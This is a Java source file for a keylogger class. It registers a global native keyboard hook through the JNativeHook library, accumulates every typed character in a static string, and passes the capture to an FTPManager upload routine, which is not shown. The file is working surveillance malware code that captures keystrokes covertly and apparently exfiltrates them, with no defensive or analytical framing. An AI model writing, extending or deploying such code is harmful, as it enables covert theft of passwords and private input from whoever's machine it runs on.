package org.dot;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
	
	static public String LINE = "";
	
    public void nativeKeyPressed(NativeKeyEvent e) {}

    public void nativeKeyReleased(NativeKeyEvent e) {}

    static {
    	try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
    }
    
    public void nativeKeyTyped(NativeKeyEvent e) {
    	switch (e.getRawCode()) {
    	case 8:
    		LINE = LINE.substring(0, LINE.length() - 2);
    		break;
    	default:
            LINE += e.getKeyChar();
    	}
    }
    
    public static void start() {
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
    
    public static void write() throws Exception {
    	if (FTPManager.upload())
    		System.out.println("Written.");
    	else
    		System.out.println("Failed.");
    }
}
